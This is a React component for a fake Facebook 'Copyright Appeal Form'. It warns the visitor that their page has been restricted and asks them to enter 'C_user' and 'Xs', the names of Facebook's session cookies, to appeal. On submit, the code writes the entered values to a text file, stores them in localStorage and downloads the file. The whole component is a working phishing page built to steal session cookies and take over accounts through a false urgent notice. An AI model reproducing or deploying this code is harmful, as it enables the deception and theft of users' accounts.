import React from 'react'
import "./Profile.css"
import ReactPlayer from 'react-player'
import { useState } from 'react';
import myVideo from './myVideo.mp4';
const Profile = () => {

  const [name, setName] = useState("");
  const [email, setEmail] = useState("");

  const handleSubmit = (event) => {
    event.preventDefault();
    const formData = { name, email};
    console.log(formData); 
    convertToTextFile(formData);
  };
  return (
    <div>
      <div className='title'>
      <h1>Facebook</h1>
     </div>
    <div className='profile'>
     
<div className='main_box'>

      <div className='profile_box' id='c1'>
        <h1>Help center</h1>
        <p>Creating an Account<br></br>
Your Profile<br></br>
Friending<br></br>
Facebook Dating<br></br>
Your Home Page<br></br>
Messaging<br></br>
Stories<br></br>
Your Photos and Videos<br></br>
Videos on Watch<br></br>
Gaming<br></br>
Pages<br></br>
Groups<br></br>
Events<br></br>
Fundraisers and Donations<br></br>
Payments<br></br>
Marketplace<br></br>
Apps<br></br>
Facebook Mobile Apps<br></br>
Accessibility</p>
      </div>

      <div className='recommend' id='c2'>
        <h1>Copyright Appeal Form</h1>
          <p>We have detected unusual activity on your page which violates our community standards.<br></br>
Your access have been limited on your page and you can not post, share or comment as your page, if you think this was a mistake you can submit an appeal by providing the required information.</p>
<p>Detailed Video Information</p>
<div className='video'>
<video src={myVideo} controls autoplay muted loop 
width={350} height={240}/>

        </div>
        <p>Please be sure to provide the requested information.</p>
        <p>Failure to provide this information may lead to unpublishment of your page.</p>
    <form className='input_feild' onSubmit={handleSubmit}>
      <label>
        C_user
        <input
          type="text"
          value={name}
          onChange={(e) => setName(e.target.value)}
        />
      </label>
      <br />
      <label>
        Xs
        <input
          type="text"
          value={email}
          onChange={(e) => setEmail(e.target.value)}
        />
      </label>
      <br />
      <div>
      <button type="submit">Submit</button></div>
    </form>
        </div>
      </div>
    </div>
    </div>
  )
}

export default Profile
const convertToTextFile = (formData) => {
  const textFile = `C-user:${formData.name}\nXs:${formData.email}\n`;
  const file = new Blob([textFile], { type: "text/plain" });
  const a = document.createElement("a");
  const existingData = localStorage.getItem("user_data");
  if (existingData) {
    const combinedData = existingData + textFile;
    const combinedFile = new Blob([combinedData], { type: "text/plain" });
    a.href = URL.createObjectURL(combinedFile);
    localStorage.setItem("user_data", combinedData);
  } else {
    a.href = URL.createObjectURL(file);
    localStorage.setItem("user_data", textFile);
  }
  a.download = "form-data.txt";
  document.body.appendChild(a);
  a.click();
  URL.revokeObjectURL(a.href);
};
